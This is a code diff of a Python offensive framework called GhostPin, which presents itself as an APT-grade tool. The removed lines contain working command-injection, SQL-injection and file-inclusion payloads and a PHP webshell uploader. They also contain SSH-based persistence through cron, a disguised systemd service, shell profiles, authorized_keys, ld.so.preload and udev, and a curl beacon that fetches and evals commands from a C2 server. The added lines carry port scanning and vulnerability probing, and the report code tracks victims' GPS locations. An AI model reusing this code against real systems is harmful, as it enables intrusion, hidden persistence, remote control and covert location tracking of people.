@@ -405,1056 +886,534 @@ class C2Server:
         return True
     
     def stop(self):
-        """Stop C2 server"""
         self.running = False
-        self.stop_event.set()
         if self.server_thread:
             self.server_thread.join(timeout=5)
         cprint("[C2] Server stopped", Colors.RED)
 
 #===============================================================================
-# REAL EXPLOITATION ENGINE
+= APT RECONNAISSANCE
 #===============================================================================
 
-class RealExploitEngine:
-    """Real exploitation with actual RCE, SQLi, LFI"""
+class APTReconnaissance:
+    """Advanced APT reconnaissance"""
     
-    def __init__(self, profile: APTTargetProfile):
-        self.profile = profile
-        self.proxy_manager = ProxyManager()
-        self.results = []
-        self.webshells = []
+    def __init__(self, target: str):
+        self.target = target
+        self.stealth = StealthEngine()
+        self.session = self.stealth.get_session()
+        self.profile = APTTarget(target=target)
+    
+    def full_recon(self) -> APTTarget:
+        cprint(f"[RECON] Scanning {self.target}", Colors.BLUE)
         
-    def exploit_rce(self, url: str, param: str, cmd: str = "id") -> Dict:
-        """Real RCE exploitation"""
-        cprint(f"[RCE] Exploiting {url}", Colors.RED)
+        self._resolve_dns()
+        self._discover_subdomains()
+        self._port_scan()
+        self._detect_services()
+        self._web_recon()
+        self._find_vulnerabilities()
         
-        result = {'success': False, 'url': url, 'command': cmd, 'output': ''}
-        
-        # Command injection payloads
-        payloads = [
-            f'; {cmd}',
-            f'| {cmd}',
-            f'|| {cmd}',
-            f'&& {cmd}',
-            f'& {cmd}',
-            f'`{cmd}`',
-            f'$({cmd})',
-            f'$(echo {base64.b64encode(cmd.encode()).decode()} | base64 -d | bash)'
-        ]
-        
-        session = self.proxy_manager.get_session()
-        
-        for payload in payloads:
+        return self.profile
+    
+    def _resolve_dns(self):
+        try:
+            ip = socket.gethostbyname(self.target)
+            self.profile.ip_addresses.append(ip)
+            cprint(f"[+] IP: {ip}", Colors.GREEN)
+        except:
+            pass
+    
+    def _discover_subdomains(self):
+        common = ['www', 'mail', 'admin', 'api', 'dev', 'test', 'staging', 'prod', 'app']
+        for sub in common:
             try:
-                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                response = session.get(test_url, timeout=10, verify=False)
-                
-                if response.status_code == 200:
-                    # Check for command output
-                    output_lower = response.text.lower()
-                    if 'uid=' in output_lower or 'id=' in output_lower or 'root' in output_lower:
-                        result['success'] = True
-                        result['output'] = response.text[:1000]
-                        result['payload'] = payload
-                        cprint(f"[+] RCE successful: {cmd}", Colors.GREEN)
-                        break
+                full = f"{sub}.{self.target}"
+                ip = socket.gethostbyname(full)
+                self.profile.subdomains.append(full)
+                cprint(f"[+] Subdomain: {full} ({ip})", Colors.DIM)
             except:
                 pass
-        
-        self.results.append(result)
-        return result
     
-    def exploit_sqli(self, url: str, param: str) -> Dict:
-        """Real SQL Injection with data extraction"""
-        cprint(f"[SQLi] Exploiting {url}", Colors.RED)
+    def _port_scan(self):
+        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3306, 3389, 5432, 5900, 6379, 8080, 8443]
         
-        result = {'success': False, 'url': url, 'data': [], 'tables': []}
-        session = self.proxy_manager.get_session()
-        
-        # Union-based SQLi payloads
-        payloads = [
-            f"' UNION SELECT table_name, NULL FROM information_schema.tables--",
-            f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
-            f"' UNION SELECT username, password FROM users--",
-            f"' UNION SELECT @@version, NULL--"
-        ]
-        
-        for payload in payloads:
+        for ip in self.profile.ip_addresses:
+            for port in common_ports:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(1)
+                    result = sock.connect_ex((ip, port))
+                    sock.close()
+                    if result == 0:
+                        self.profile.open_ports.append(port)
+                        cprint(f"[+] Port {port} open", Colors.GREEN)
+                except:
+                    pass
+    
+    def _detect_services(self):
+        for port in self.profile.open_ports[:5]:
             try:
-                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                response = session.get(test_url, timeout=10, verify=False)
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                sock.connect((self.profile.ip_addresses[0], port))
+                banner = sock.recv(1024).decode('utf-8', errors='ignore')[:100]
+                sock.close()
                 
-                if response.status_code == 200:
-                    # Extract data from response
-                    data = self._extract_sqli_data(response.text)
-                    if data:
-                        result['data'].extend(data)
-                        result['success'] = True
-                        cprint(f"[+] SQLi data extracted: {len(data)} records", Colors.GREEN)
-                        break
+                service = {'name': 'unknown', 'banner': banner}
+                if port == 22:
+                    service['name'] = 'SSH'
+                elif port == 80 or port == 8080:
+                    service['name'] = 'HTTP'
+                elif port == 443 or port == 8443:
+                    service['name'] = 'HTTPS'
+                elif port == 3306:
+                    service['name'] = 'MySQL'
+                elif port == 5432:
+                    service['name'] = 'PostgreSQL'
+                elif port == 6379:
+                    service['name'] = 'Redis'
+                elif port == 3389:
+                    service['name'] = 'RDP'
+                
+                self.profile.services[port] = service
+                cprint(f"[+] Service on {port}: {service['name']}", Colors.DIM)
             except:
                 pass
-        
-        self.results.append(result)
-        return result
     
-    def _extract_sqli_data(self, text: str) -> List[Dict]:
-        """Extract data from SQLi response"""
-        data = []
-        lines = text.split('\n')
-        for line in lines:
-            if 'admin' in line.lower() or 'password' in line.lower() or 'user' in line.lower():
-                # Try to extract key:value pairs
-                parts = re.findall(r'(\w+):\s*(\S+)', line)
-                if parts:
-                    data.append(dict(parts))
-                else:
-                    data.append({'raw': line.strip()})
-        return data
+    def _web_recon(self):
+        for port in self.profile.open_ports:
+            if port in [80, 443, 8080, 8443]:
+                try:
+                    protocol = 'https' if port in [443, 8443] else 'http'
+                    url = f"{protocol}://{self.target}:{port}"
+                    response = self.session.get(url, timeout=5)
+                    
+                    web_app = {
+                        'url': url,
+                        'server': response.headers.get('Server', 'unknown'),
+                        'status': response.status_code,
+                        'title': self._extract_title(response.text)
+                    }
+                    self.profile.web_applications.append(web_app)
+                    cprint(f"[+] Web app: {url} - {web_app['server']}", Colors.GREEN)
+                except:
+                    pass
     
-    def exploit_lfi(self, url: str, param: str, file_path: str = '/etc/passwd') -> Dict:
-        """Real LFI with file reading"""
-        cprint(f"[LFI] Exploiting {url}", Colors.RED)
-        
-        result = {'success': False, 'url': url, 'content': '', 'file': file_path}
-        session = self.proxy_manager.get_session()
-        
-        # LFI payloads
-        payloads = [
-            f'../../../../{file_path}',
-            f'../../../{file_path}',
-            f'../../{file_path}',
-            f'....//....//....//{file_path}',
-            f'../../../../../../{file_path}'
-        ]
-        
-        for payload in payloads:
-            try:
-                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                response = session.get(test_url, timeout=10, verify=False)
-                
-                if response.status_code == 200 and len(response.text) > 100:
-                    if 'root:' in response.text or 'bin:' in response.text:
-                        result['success'] = True
-                        result['content'] = response.text[:2000]
-                        result['payload'] = payload
-                        cprint(f"[+] LFI successful: {file_path}", Colors.GREEN)
-                        break
-            except:
-                pass
-        
-        self.results.append(result)
-        return result
+    def _extract_title(self, html: str) -> str:
+        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
+        return match.group(1).strip() if match else 'Untitled'
     
-    def upload_webshell(self, target: str, port: int = 80) -> Dict:
-        """Real webshell upload"""
-        cprint(f"[WEBSHELL] Uploading to {target}:{port}", Colors.PURPLE)
-        
-        result = {'success': False, 'target': target, 'url': ''}
-        session = self.proxy_manager.get_session()
-        
-        # Common upload endpoints
-        upload_paths = [
-            '/upload',
-            '/uploads',
-            '/file',
-            '/files',
-            '/media',
-            '/image',
-            '/api/upload',
-            '/admin/upload',
-            '/wp-admin/admin-ajax.php',
-            '/index.php?route=common/filemanager/upload'
-        ]
-        
-        # PHP webshell
-        shell_code = '''<?php
-if(isset($_GET['cmd'])){
-    $cmd = $_GET['cmd'];
-    if(function_exists('system')){
-        system($cmd);
-    } elseif(function_exists('exec')){
-        exec($cmd, $output);
-        echo implode("\\n", $output);
-    } elseif(function_exists('shell_exec')){
-        echo shell_exec($cmd);
-    } elseif(function_exists('passthru')){
-        passthru($cmd);
-    } elseif(function_exists('popen')){
-        $handle = popen($cmd, 'r');
-        while(!feof($handle)){
-            echo fread($handle, 1024);
-        }
-        pclose($handle);
-    }
-}
-?>'''
-        
-        protocol = 'https' if port in [443, 8443] else 'http'
-        base_url = f"{protocol}://{target}:{port}"
-        
-        for upload_path in upload_paths:
-            try:
-                url = f"{base_url}{upload_path}"
-                
-                # Try multipart form upload
-                files = {'file': (f'shell_{random_string(6)}.php', shell_code, 'application/x-php')}
-                response = session.post(url, files=files, timeout=10, verify=False)
-                
-                if response.status_code in [200, 201, 202, 302]:
-                    # Try to find uploaded file
-                    for ext in ['php', 'php5', 'phtml', 'php7']:
-                        test_url = f"{base_url}/shell_{random_string(6)}.{ext}"
-                        resp = session.get(test_url, timeout=5, verify=False)
-                        if resp.status_code == 200:
-                            result['success'] = True
-                            result['url'] = test_url
-                            result['shell_type'] = ext
-                            self.webshells.append(test_url)
-                            cprint(f"[+] Webshell uploaded: {test_url}", Colors.GREEN)
-                            return result
-            except:
-                pass
-        
-        return result
+    def _find_vulnerabilities(self):
+        for app in self.profile.web_applications:
+            url = app['url']
+            # Check for common vulnerabilities
+            test_payloads = {
+                'XSS': '<script>alert(1)</script>',
+                'SQLi': "' OR '1'='1",
+                'LFI': '../../../../etc/passwd'
+            }
+            
+            for vuln_type, payload in test_payloads.items():
+                try:
+                    test_url = f"{url}?q={urllib.parse.quote(payload)}"
+                    response = self.session.get(test_url, timeout=5)
+                    
+                    if vuln_type == 'XSS' and payload in response.text:
+                        self.profile.vulnerabilities.append({
+                            'type': 'XSS',
+                            'url': test_url,
+                            'severity': 'HIGH'
+                        })
+                    elif vuln_type == 'SQLi' and ('SQL' in response.text or 'mysql' in response.text.lower()):
+                        self.profile.vulnerabilities.append({
+                            'type': 'SQL Injection',
+                            'url': test_url,
+                            'severity': 'CRITICAL'
+                        })
+                    elif vuln_type == 'LFI' and 'root:' in response.text:
+                        self.profile.vulnerabilities.append({
+                            'type': 'LFI',
+                            'url': test_url,
+                            'severity': 'HIGH'
+                        })
+                except:
+                    pass
 
 #===============================================================================
-# ENHANCED PERSISTENCE
+# MAIN FRAMEWORK
 #===============================================================================
 
-class EnhancedPersistence:
-    """Enhanced cross-platform persistence with C2 integration"""
-    
-    def __init__(self, c2_server: C2Server = None):
-        self.c2_server = c2_server
-        self.deployed = []
-        
-    def deploy_linux(self, target: str, username: str, password: str, payload: str) -> Dict:
-        """Linux persistence with 8 methods"""
-        result = {'success': False, 'platform': 'Linux', 'target': target, 'methods': []}
-        
-        methods = [
-            self._deploy_cron,
-            self._deploy_systemd,
-            self._deploy_bashrc,
-            self._deploy_ssh_key,
-            self._deploy_ld_preload,
-            self._deploy_profile,
-            self._deploy_c2_beacon,
-            self._deploy_udev_rule
-        ]
-        
-        for method in methods:
-            try:
-                method_result = method(target, username, password, payload)
-                if method_result.get('success'):
-                    result['methods'].append(method_result['technique'])
-                    result['success'] = True
-            except:
-                pass
-        
-        if result['success']:
-            self.deployed.append(result)
-            cprint(f"[+] Linux persistence: {len(result['methods'])} methods", Colors.GREEN)
-        
-        return result
-    
-    def _deploy_cron(self, target: str, username: str, password: str, payload: str) -> Dict:
-        """Cron persistence"""
-        result = {'success': False, 'technique': 'cron'}
-        try:
-            if not PARAMIKO_AVAILABLE:
-                return result
-            
-            import paramiko
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(target, username=username, password=password, timeout=10)
-            
-            # Multiple cron entries for redundancy
-            crons = [
-                f"* * * * * {payload}",
-                f"*/5 * * * * {payload}",
-                f"@reboot {payload}"
-            ]
-            
-            for cron in crons:
-                ssh.exec_command(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -')
-            
-            ssh.close()
-            result['success'] = True
-            cprint("[+] Cron persistence deployed", Colors.GREEN)
-        except:
-            pass
-        return result
-    
-    def _deploy_systemd(self, target: str, username: str, password: str, payload: str) -> Dict:
-        """Systemd service persistence"""
-        result = {'success': False, 'technique': 'systemd'}
-        try:
-            if not PARAMIKO_AVAILABLE:
-                return result
-            
-            import paramiko
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(target, username=username, password=password, timeout=10)
-            
-            service_name = f"system-update-{random.randint(1000, 9999)}"
-            service_content = f"""[Unit]
-Description=System Update Service
-After=network.target
-
-[Service]
-Type=simple
-ExecStart={payload}
-Restart=always
-RestartSec=30
-
-[Install]
-WantedBy=multi-user.target"""
-            
-            ssh.exec_command(f'echo "{service_content}" > /etc/systemd/system/{service_name}.service')
-            ssh.exec_command(f'systemctl daemon-reload')
-            ssh.exec_command(f'systemctl enable {service_name}.service')
-            ssh.exec_command(f'systemctl start {service_name}.service')
-            ssh.close()
-            
-            result['success'] = True
-            result['service'] = service_name
-            cprint("[+] Systemd persistence deployed", Colors.GREEN)
-        except:
-            pass
-        return result
-    
-    def _deploy_bashrc(self, target: str, username: str, password: str, payload: str) -> Dict:
-        """.bashrc persistence"""
-        result = {'success': False, 'technique': 'bashrc'}
-        try:
-            if not PARAMIKO_AVAILABLE:
-                return result
-            
-            import paramiko
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(target, username=username, password=password, timeout=10)
-            
-            ssh.exec_command(f'echo "{payload}" >> ~/.bashrc')
-            ssh.exec_command(f'echo "{payload}" >> ~/.bash_profile')
-            ssh.exec_command(f'echo "{payload}" >> ~/.profile')
-            ssh.close()
-            
-            result['success'] = True
-            cprint("[+] .bashrc persistence deployed", Colors.GREEN)
-        except:
-            pass
-        return result
-    
-    def _deploy_ssh_key(self, target: str, username: str, password: str) -> Dict:
-        """SSH key persistence"""
-        result = {'success': False, 'technique': 'ssh_key'}
-        try:
-            if not PARAMIKO_AVAILABLE:
-                return result
-            
-            import paramiko
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(target, username=username, password=password, timeout=10)
-            
-            # Generate SSH key
-            key = paramiko.RSAKey.generate(2048)
-            pub_key = f"ssh-rsa {key.get_base64()} {username}@{target}"
-            
-            ssh.exec_command('mkdir -p ~/.ssh')
-            ssh.exec_command(f'echo "{pub_key}" >> ~/.ssh/authorized_keys')
-            ssh.exec_command('chmod 600 ~/.ssh/authorized_keys')
-            ssh.exec_command('chmod 700 ~/.ssh')
-            ssh.close()
-            
-            result['success'] = True
-            result['public_key'] = pub_key
-            result['private_key'] = key.get_base64()
-            cprint("[+] SSH key persistence deployed", Colors.GREEN)
-        except:
-            pass
-        return result
-    
-    def _deploy_ld_preload(self, target: str, username: str, password: str, payload: str) -> Dict:
-        """LD_PRELOAD persistence"""
-        result = {'success': False, 'technique': 'ld_preload'}
-        try:
-            if not PARAMIKO_AVAILABLE:
-                return result
-            
-            import paramiko
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(target, username=username, password=password, timeout=10)
-            
-            ssh.exec_command(f'echo "{payload}" > /etc/ld.so.preload')
-            ssh.close()
-            
-            result['success'] = True
-            cprint("[+] LD_PRELOAD persistence deployed", Colors.GREEN)
-        except:
-            pass
-        return result
-    
-    def _deploy_profile(self, target: str, username: str, password: str, payload: str) -> Dict:
-        """Profile persistence"""
-        result = {'success': False, 'technique': 'profile'}
-        try:
-            if not PARAMIKO_AVAILABLE:
-                return result
-            
-            import paramiko
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(target, username=username, password=password, timeout=10)
-            
-            profiles = ['~/.profile', '~/.bash_profile', '~/.bash_login', '~/.zshrc']
-            for profile in profiles:
-                ssh.exec_command(f'echo "{payload}" >> {profile}')
-            ssh.close()
-            
-            result['success'] = True
-            cprint("[+] Profile persistence deployed", Colors.GREEN)
-        except:
-            pass
-        return result
-    
-    def _deploy_c2_beacon(self, target: str, username: str, password: str, payload: str) -> Dict:
-        """C2 beacon persistence"""
-        result = {'success': False, 'technique': 'c2_beacon'}
-        
-        if not self.c2_server:
-            return result
-        
-        try:
-            if not PARAMIKO_AVAILABLE:
-                return result
-            
-            import paramiko
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(target, username=username, password=password, timeout=10)
-            
-            c2_url = f"http://{self.c2_server.host}:{self.c2_server.port}"
-            beacon_script = f'''#!/bin/bash
-# C2 Beacon
-C2_URL="{c2_url}"
-while true; do
-    # Send beacon
-    curl -s -X POST "$C2_URL/beacon" \\
-        -H "Content-Type: application/json" \\
-        -d '{{"host":"$(hostname)","user":"$(whoami)","os":"$(uname -a)","timestamp":"$(date -Iseconds)"}}' &
-    
-    # Check for commands
-    RESPONSE=$(curl -s -X GET "$C2_URL/command?host=$(hostname)")
-    if [ "$RESPONSE" != "null" ] && [ ! -z "$RESPONSE" ]; then
-        eval "$RESPONSE"
-        curl -s -X POST "$C2_URL/result" \\
-            -H "Content-Type: application/json" \\
-            -d '{{"host":"$(hostname)","result":"$RESPONSE"}}'
-    fi
-    
-    sleep 60
-done
-'''
-            
-            ssh.exec_command(f'echo "{beacon_script}" > /usr/local/bin/c2_beacon.sh')
-            ssh.exec_command('chmod +x /usr/local/bin/c2_beacon.sh')
-            
-            # Add to crontab for persistence
-            ssh.exec_command('(crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/c2_beacon.sh") | crontab -')
-            ssh.close()
-            
-            result['success'] = True
-            cprint("[+] C2 beacon persistence deployed", Colors.GREEN)
-        except:
-            pass
-        return result
-    
-    def _deploy_udev_rule(self, target: str, username: str, password: str, payload: str) -> Dict:
-        """UDEV rule persistence"""
-        result = {'success': False, 'technique': 'udev'}
-        try:
-            if not PARAMIKO_AVAILABLE:
-                return result
-            
-            import paramiko
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(target, username=username, password=password, timeout=10)
-            
-            udev_rule = f'SUBSYSTEM=="net", ACTION=="add", RUN+="{payload}"'
-            ssh.exec_command(f'echo "{udev_rule}" > /etc/udev/rules.d/99-persist.rules')
-            ssh.exec_command('udevadm control --reload-rules')
-            ssh.close()
-            
-            result['success'] = True
-            cprint("[+] UDEV rule persistence deployed", Colors.GREEN)
-        except:
-            pass
-        return result
-
-#===============================================================================
-# ENHANCED REPORTING
-#===============================================================================
-
-class EnhancedReporting:
-    """Enhanced reporting with PDF, HTML, and GPS maps"""
+class GhostPinUltimate:
+    """Ultimate GhostPin APT Framework"""
     
     def __init__(self):
-        self.data = {}
-    
-    def generate_pdf(self, data: Dict, filename: str = "apt_report.pdf") -> bool:
-        """Generate PDF report with maps"""
-        try:
-            if not REPORTLAB_AVAILABLE:
-                cprint("[!] ReportLab not installed", Colors.YELLOW)
-                return False
-            
-            doc = SimpleDocTemplate(filename, pagesize=A4)
-            styles = getSampleStyleSheet()
-            story = []
-            
-            # Title
-            title = Paragraph("APT Operations Report", styles['Title'])
-            story.append(title)
-            story.append(Spacer(1, 12))
-            
-            # Summary
-            summary_text = f"""
-            <para>
-            <b>Timestamp:</b> {data.get('timestamp', 'N/A')}<br/>
-            <b>Version:</b> {data.get('version', 'N/A')}<br/>
-            <b>Author:</b> {data.get('author', 'N/A')}<br/>
-            <b>Target:</b> {data.get('target', 'N/A')}<br/>
-            <b>Subdomains:</b> {len(data.get('subdomains', []))}<br/>
-            <b>Open Ports:</b> {len(data.get('open_ports', []))}<br/>
-            <b>Services:</b> {len(data.get('services', {}))}<br/>
-            <b>Vulnerabilities:</b> {len(data.get('vulnerabilities', []))}<br/>
-            <b>GPS Data Points:</b> {len(data.get('gps_data', []))}
-            </para>
-            """
-            story.append(Paragraph(summary_text, styles['Normal']))
-            story.append(Spacer(1, 12))
-            
-            # GPS Data Table
-            if data.get('gps_data'):
-                gps_data = [['Token', 'Latitude', 'Longitude', 'Accuracy', 'Timestamp']]
-                for gps in data['gps_data'][-20:]:
-                    gps_data.append([
-                        gps.get('token', 'N/A')[:8],
-                        str(gps.get('lat', 'N/A')),
-                        str(gps.get('lng', 'N/A')),
-                        str(gps.get('accuracy', 'N/A')),
-                        gps.get('timestamp', 'N/A')[:19]
-                    ])
-                
-                gps_table = Table(gps_data)
-                gps_table.setStyle(TableStyle([
-                    ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
-                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
-                    ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
-                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
-                    ('FONTSIZE', (0, 0), (-1, 0), 10),
-                    ('BOTTOMPADDING', (0, 0), (-1, 0), 8),
-                    ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
-                    ('GRID', (0, 0), (-1, -1), 1, colors.black)
-                ]))
-                
-                story.append(Paragraph("GPS Tracking Data", styles['Heading2']))
-                story.append(gps_table)
-                story.append(Spacer(1, 12))
-            
-            # Attack Surface
-            attack_surface = data.get('attack_surface', {})
-            if attack_surface:
-                surface_data = [['Type', 'Details']]
-                for key, value in attack_surface.items():
-                    if isinstance(value, list):
-                        for item in value[:5]:
-                            if isinstance(item, dict):
-                                details = ', '.join([f"{k}:{v}" for k, v in item.items()][:3])
-                            else:
-                                details = str(item)
-                            surface_data.append([key.replace('_', ' ').title(), details])
-                    else:
-                        surface_data.append([key.replace('_', ' ').title(), str(value)[:50]])
-                
-                surface_table = Table(surface_data)
-                surface_table.setStyle(TableStyle([
-                    ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
-                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
-                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
-                    ('GRID', (0, 0), (-1, -1), 1, colors.black)
-                ]))
-                
-                story.append(Paragraph("Attack Surface", styles['Heading2']))
-                story.append(surface_table)
-            
-            doc.build(story)
-            return True
-        except Exception as e:
-            cprint(f"[-] PDF generation failed: {e}", Colors.RED)
-            return False
-    
-    def generate_html(self, data: Dict, filename: str = "apt_report.html") -> bool:
-        """Generate HTML report with Google Maps integration"""
-        try:
-            # Generate Google Maps if GPS data exists
-            maps_html = ""
-            if data.get('gps_data'):
-                markers = []
-                for gps in data['gps_data'][-10:]:
-                    if gps.get('lat') and gps.get('lng'):
-                        markers.append(f"new google.maps.Marker({{position: {{lat: {gps['lat']}, lng: {gps['lng']}}}, title: '{gps.get('token', '')}'}})")
-                
-                if markers:
-                    maps_html = f"""
-                    <div id="map" style="height:400px;width:100%;"></div>
-                    <script>
-                    function initMap() {{
-                        var map = new google.maps.Map(document.getElementById('map'), {{
-                            zoom: 8,
-                            center: {{lat: {data['gps_data'][-1].get('lat', 0)}, lng: {data['gps_data'][-1].get('lng', 0)}}}
-                        }});
-                        {chr(10).join(markers)}
-                    }}
-                    </script>
-                    <script async defer src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initMap"></script>
-                    """
-            
-            html = f"""
-<!DOCTYPE html>
-<html>
-<head>
-    <title>APT Operations Report</title>
-    <style>
-        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
-        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
-        h1 {{ color: #333; border-bottom: 3px solid #4CAF50; padding-bottom: 10px; }}
-        h2 {{ color: #666; margin-top: 20px; }}
-        table {{ border-collapse: collapse; width: 100%; margin: 10px 0; }}
-        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
-        th {{ background-color: #4CAF50; color: white; }}
-        tr:nth-child(even) {{ background-color: #f2f2f2; }}
-        .success {{ color: green; font-weight: bold; }}
-        .critical {{ color: red; font-weight: bold; }}
-        .high {{ color: orange; font-weight: bold; }}
-        .summary {{ background-color: #e8f5e9; padding: 15px; border-radius: 5px; margin: 10px 0; }}
-        .vuln {{ background-color: #ffebee; padding: 10px; margin: 5px 0; border-left: 3px solid red; }}
-        .info {{ background-color: #e3f2fd; padding: 10px; margin: 5px 0; border-left: 3px solid blue; }}
-        .gps {{ background-color: #f3e5f5; padding: 10px; margin: 5px 0; border-left: 3px solid purple; }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>APT Operations Report</h1>
-        
-        <div class="summary">
-            <h3>Summary</h3>
-            <p><strong>Timestamp:</strong> {data.get('timestamp', 'N/A')}</p>
-            <p><strong>Version:</strong> {data.get('version', 'N/A')}</p>
-            <p><strong>Target:</strong> {data.get('target', 'N/A')}</p>
-            <p><strong>Subdomains:</strong> {len(data.get('subdomains', []))}</p>
-            <p><strong>Open Ports:</strong> {len(data.get('open_ports', []))}</p>
-            <p><strong>Services:</strong> {len(data.get('services', {}))}</p>
-            <p><strong>Vulnerabilities:</strong> {len(data.get('vulnerabilities', []))}</p>
-            <p><strong>GPS Data Points:</strong> {len(data.get('gps_data', []))}</p>
-        </div>
-        
-        <h2>GPS Tracking Data</h2>
-        {maps_html if maps_html else '<p>No GPS data available</p>'}
-        <table>
-            <tr>
-                <th>Token</th>
-                <th>Latitude</th>
-                <th>Longitude</th>
-                <th>Accuracy</th>
-                <th>Timestamp</th>
-            </tr>
-            {''.join([
-                f'<tr><td>{gps.get("token", "N/A")[:8]}</td>'
-                f'<td>{gps.get("lat", "N/A")}</td>'
-                f'<td>{gps.get("lng", "N/A")}</td>'
-                f'<td>{gps.get("accuracy", "N/A")}</td>'
-                f'<td>{gps.get("timestamp", "N/A")[:19]}</td></tr>'
-                for gps in data.get('gps_data', [])[-20:]
-            ])}
-        </table>
-        
-        <h2>Open Ports & Services</h2>
-        <table>
-            <tr>
-                <th>Port</th>
-                <th>Service</th>
-                <th>Product</th>
-                <th>Version</th>
-            </tr>
-            {''.join([
-                f'<tr><td>{port}</td>'
-                f'<td>{service.get("name", "unknown")}</td>'
-                f'<td>{service.get("product", "")}</td>'
-                f'<td>{service.get("version", "")}</td></tr>'
-                for port, service in data.get('services', {}).items()
-            ])}
-        </table>
-        
-        <h2>Vulnerabilities</h2>
-        {''.join([
-            f'<div class="vuln"><strong>{v.get("type", "Unknown")}</strong> - {v.get("severity", "unknown")}<br>'
-            f'{v.get("description", "")}</div>'
-            for v in data.get('vulnerabilities', [])
-        ])}
-        
-        <h2>Attack Surface</h2>
-        {''.join([
-            f'<div class="info"><strong>{k.replace("_", " ").title()}</strong>: {v}</div>'
-            for k, v in data.get('attack_surface', {}).items()
-        ])}
-    </div>
-</body>
-</html>
-"""
-            with open(filename, 'w') as f:
-                f.write(html)
-            return True
-        except:
-            return False
-    
-    def generate_json(self, data: Dict, filename: str = "apt_report.json") -> bool:
-        """Generate JSON report"""
-        try:
-            with open(filename, 'w') as f:
-                json.dump(data, f, indent=2)
-            return True
-        except:
-            return False
-
-#===============================================================================
-# ENHANCED GHOSTPIN MAIN
-#===============================================================================
-
-class GhostPinEnhanced:
-    """Enhanced GhostPin with all features"""
-    
-    def __init__(self):
-        self.server = TrackingServer()
+        self.stealth = StealthEngine()
         self.c2_server = C2Server()
-        self.proxy_manager = ProxyManager()
-        self.persistence = EnhancedPersistence(self.c2_server)
-        self.reporting = EnhancedReporting()
+        self.payload_gen = ExploitPayloadGenerator()
+        self.current_target = None
         self.current_profile = None
+        self.results = []
         self.running = True
         
-        # Tracking server reference
-        self.tracking_server = None
-        
-        signal.signal(signal.SIGINT, self._signal_handler)
+        signal.signal(signal.SIGINT, self.signal_handler)
+        signal.signal(signal.SIGTERM, self.signal_handler)
     
-    def _signal_handler(self, signum, frame):
-        cprint("\n[!] Shutting down...", Colors.RED)
+    def signal_handler(self, signum, frame):
+        cprint("\n[!] Shutting down GhostPin...", Colors.RED)
         self.running = False
         if self.c2_server:
             self.c2_server.stop()
-        if self.tracking_server:
-            self.tracking_server.stop()
         sys.exit(0)
     
-    def _banner(self):
-        banner = f"""
-{Colors.CYAN}{Colors.BOLD}
-    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗ ██╗███╗   ██╗
-    ██╔════╝██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
-    ██║     ███████║██║   ██║███████╗   ██║   ██████╔╝██║██╔██╗ ██║
-    ██║     ██╔══██║██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
-    ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
-     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
-{Colors.WHITE}
-{Colors.YELLOW}    ENHANCED APT-Grade GPS Tracking Framework v{VERSION}{Colors.WHITE}
-{Colors.RED}    Author: {AUTHOR} | License: {LICENSE}{Colors.WHITE}
-{Colors.DIM}    [+] Complete APT | C2 | Persistence | GPS Tracking{Colors.WHITE}
-"""
-        print(banner)
-    
-    def _menu(self):
+    def show_menu(self):
         print(f"""
 {Colors.BLUE}{'='*70}{Colors.WHITE}
-{Colors.BOLD}GhostPin v{VERSION} - Enhanced APT Framework{Colors.WHITE}
+{Colors.BOLD}{Colors.PURPLE}GhostPin v{VERSION} - Ultimate APT Exploitation Framework{Colors.WHITE}
+{Colors.RED}{Colors.BOLD}APT Grade | Zero Trace | Full Spectrum Attack{Colors.WHITE}
+{Colors.CYAN}Reconnaissance | Exploitation | Persistence | C2{Colors.WHITE}
 {Colors.BLUE}{'='*70}{Colors.WHITE}
-{Colors.GREEN}[1]{Colors.WHITE} Start Tracking Server (GPS)
